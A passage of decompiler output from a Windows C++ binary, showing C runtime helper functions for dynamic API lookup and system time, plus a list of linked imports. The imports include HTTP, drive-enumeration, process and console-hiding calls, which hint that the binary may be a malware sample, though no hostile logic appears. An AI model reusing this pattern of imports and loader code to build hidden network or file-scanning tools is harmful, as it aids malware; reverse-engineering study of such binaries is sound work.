            v6 = v8;
            if ((int32_t *)a4 != a3) {
                int32_t * v9 = (int32_t *)(v8 - 4);
                int32_t v10 = (int32_t)a3; // 0x417700
                *v9 = *(int32_t *)v10;
                int32_t v11 = function_417754((int32_t)&g36); // 0x4176f6
                while (v11 == 0) {
                    // 0x417700
                    v10 += 4;
                    if (v10 == (int32_t)a4) {
                        // 0x417708
                        v5 = g23;
                        v6 = v8;
                        goto lab_0x41773d;
                    }
                    *v9 = *(int32_t *)v10;
                    v11 = function_417754((int32_t)&g36);
                }
                // 0x417714
                *v9 = (int32_t)a2;
                int32_t v12 = v8 - 8; // 0x417717
                *(int32_t *)v12 = v11;
                int32_t (*func)() = GetProcAddress(&g36, (char *)&g36); // 0x417718
                if (func != NULL) {
                    int32_t v13 = (int32_t)func; // 0x417718
                    *(int32_t *)(v8 - 12) = v13;
                    *v1 = _3f__3f__24___crt_fast_encode_pointer_40_P6AXXZ_40__40_YAP6AXXZQ6AXXZ_40_Z((void (*)())&g36);
                    // 0x41774f
                    return (int32_t *)v13;
                }
                // 0x417737
                v5 = g23;
                v6 = v12;
            }
            // break -> 0x41773d
            break;
        }
        default: {
            // 0x41774f
            return (int32_t *)v4;
        }
    }
    goto lab_0x41773d;
  lab_0x41773d:
    // 0x41773d
    *(int32_t *)(v6 - 4) = 32;
    uint32_t v14 = -v5 & 31; // 0x417747
    int32_t v15 = -1; // 0x417747
    if (v14 != 0) {
        v15 = -1 << 32 - v14 | 0xffffffff >> v14;
    }
    *v1 = v15 ^ v5;
    // 0x41774f
    return (int32_t *)0;
}

// Address range: 0x417754 - 0x4177cf
int32_t function_417754(int32_t a1) {
    int32_t v1 = 4 * a1; // 0x41775d
    int32_t * v2 = (int32_t *)(v1 + (int32_t)&g26); // 0x417764
    int32_t v3 = *v2; // 0x417764
    if (v3 != 0) {
        // 0x4177cc
        return v3 == -1 ? 0 : v3;
    }
    int16_t * lpLibFileName = (int16_t *)*(int32_t *)(v1 + (int32_t)&g1); // 0x417785
    int16_t * v4 = lpLibFileName; // bp-28, 0x417785
    int32_t * hFile = LoadLibraryExW(lpLibFileName, NULL, 2048); // 0x417786
    int32_t dwFlags = (int32_t)hFile; // 0x417786
    int16_t ** v5 = &v4; // 0x417790
    int32_t result = dwFlags; // 0x417790
    if (hFile == NULL) {
        // 0x417792
        if (GetLastError() != 87) {
            // 0x4177b0
            *v2 = -1;
            // 0x4177cc
            return 0;
        }
        int16_t * v6 = lpLibFileName; // bp-40, 0x41779f
        int32_t * v7 = LoadLibraryExW(lpLibFileName, hFile, dwFlags); // 0x4177a0
        v5 = &v6;
        result = (int32_t)v7;
        if (v7 == NULL) {
            // 0x4177b0
            *v2 = -1;
            // 0x4177cc
            return 0;
        }
    }
    // 0x4177b9
    *v2 = result;
    if (*v2 != 0) {
        // 0x4177c1
        *(int32_t *)((int32_t)v5 - 4) = result;
        FreeLibrary(&g36);
    }
    // 0x4177cc
    return result;
}

// Address range: 0x4179ec - 0x417a42
int32_t function_4179ec(int32_t * lpSystemTimeAsFileTime, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x4179ec
    int32_t v1; // bp-4, 0x4179ec
    int32_t v2; // 0x4179ec
    int32_t v3; // 0x4179ec
    int32_t * v4 = _3f_try_get_function_40__40_YAPAXW4function_id_40__3f_A0x391cf84c_40__40_QBDQBW4module_id_40_2_40_2_40_Z(15, "GetSystemTimePreciseAsFileTime", &g2, "GetSystemTimePreciseAsFileTime", v2, g23 ^ (int32_t)&v1, v3); // 0x417a0e
    if (v4 == NULL) {
        // 0x417a2b
        GetSystemTimeAsFileTime((struct _FILETIME *)lpSystemTimeAsFileTime);
    } else {
        // 0x417a1f
        ___except_validate_context_record();
    }
    // 0x417a31
    return _40___security_check_cookie_40_4();
}

// --------------- Statically Linked Functions ----------------

// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__24___crt_fast_encode_pointer_40_P6AXXZ_40__40_YAP6AXXZQ6AXXZ_40_Z(void (*a1)());
// int32_t _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G_Ref_count_base_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__mbstowcs_l_helper_40__40_YAIPA_WPBDIPAU__crt_locale_pointers_40__40__40_Z(int32_t * a1, char * a2, int32_t a3, int32_t * a4);
// int32_t _40___security_check_cookie_40_4(void);
// int32_t ___acrt_iob_func(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
// int32_t ___report_securityfailure(int32_t a1, int32_t a2);
// int32_t ___stdio_common_vfprintf(int32_t a1, int32_t a2);
// int32_t __alldvrm(void);
// int32_t __chkstk(void);
// int * __errno(void);
// int32_t __free_base(void);
// int32_t __invalid_parameter_noinfo(void);
// char * __cdecl itoa(_In_ int Value, char * Buffer, _In_ int Radix);
// int32_t __malloc_base(void);
// int32_t _memcpy(void);
// void * memset(void * s, int c, size_t n);
// int rand(void);
// void srand(unsigned int seed);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);

// --------------- Dynamically Linked Functions ---------------

// BOOL CloseHandle(_In_ HANDLE hObject);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// void * GdipAlloc(size_t size);
// GpStatus GdipCloneImage(GpImage * image, GpImage ** cloneImage);
// GpStatus GdipDisposeImage(GpImage * image);
// void GdipFree(void * ptr);
// HWND GetConsoleWindow(VOID);
// DWORD GetCurrentProcessId(VOID);
// UINT GetDriveTypeW(_In_opt_ LPCWSTR lpRootPathName);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// DWORD GetModuleFileNameW(_In_opt_ HMODULE hModule, LPWSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetSystemTimeAsFileTime(_Out_ LPFILETIME lpSystemTimeAsFileTime);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetTickCount(VOID);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExW(_Inout_ LPOSVERSIONINFOW lpVersionInformation);
// int32_t HttpOpenRequestA(void);
// BOOL HttpSendRequestA(_In_ HINTERNET hRequest, LPCSTR lpszHeaders, _In_ DWORD dwHeadersLength, LPVOID lpOptional, _In_ DWORD dwOptionalLength);
// char * inet_ntoa(_In_ struct in_addr in);
// BOOL InternetCheckConnectionA(_In_ LPCSTR lpszUrl, _In_ DWORD dwFlags, _In_ DWORD dwReserved);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetConnectA(_In_ HINTERNET hInternet, _In_ LPCSTR lpszServerName, _In_ INTERNET_PORT nServerPort, _In_ LPCSTR lpszUsername, _In_ LPCSTR lpszPassword, _In_ DWORD dwService, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// BOOL InternetGetConnectedState(_Out_ LPDWORD lpdwFlags, DWORD dwReserved);
// HINTERNET InternetOpenA(_In_ LPCSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCSTR lpszProxyName, _In_ LPCSTR lpszProxyBypass, _In_ DWORD dwFlags);
// HINTERNET InternetOpenUrlW(_In_ HINTERNET hInternet, _In_ LPCWSTR lpszUrl, _In_ LPCWSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenW(_In_ LPCWSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCWSTR lpszProxyName, _In_ LPCWSTR lpszProxyBypass, _In_ DWORD dwFlags);
// BOOL InternetReadFile(_In_ HINTERNET hFile, LPVOID lpBuffer, _In_ DWORD dwNumberOfBytesToRead, _Out_ LPDWORD lpdwNumberOfBytesRead);
// HMODULE LoadLibraryExW(_In_ LPCWSTR lpLibFileName, HANDLE hFile, _In_ DWORD dwFlags);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// HLOCAL LocalFree(HLOCAL hMem);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrlenA(_In_ LPCSTR lpString);
// int lstrlenW(_In_ LPCWSTR lpString);
// HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// BOOL ReleaseMutex(_In_ HANDLE hMutex);
// BOOL ShowWindow(_In_ HWND hWnd, _In_ int nCmdShow);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// PCSTR StrStrIA(_In_ PCSTR pszFirst, _In_ PCSTR pszSrch);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (14.0)
// Detected language: C++
// Detected functions: 39
